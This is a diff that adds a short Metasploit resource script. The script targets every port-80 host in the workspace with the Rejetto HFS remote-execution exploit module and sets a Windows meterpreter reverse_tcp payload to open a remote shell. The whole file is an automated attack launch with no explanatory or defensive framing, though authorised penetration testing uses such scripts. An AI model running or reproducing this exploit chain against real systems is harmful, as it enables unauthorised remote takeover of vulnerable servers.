@@ -1,0 +1,15 @@
+# hfs_rejetto.rc
+
+echo "========== HFS REJETTO EXPLOIT =========="
+workspace
+
+services -p 80
+services -p 80 -R
+
+use exploit/windows/http/rejetto_hfs_exec
+set RPORT 80
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit -j
+
+echo "========== EXPLOIT LAUNCHED =========="
+
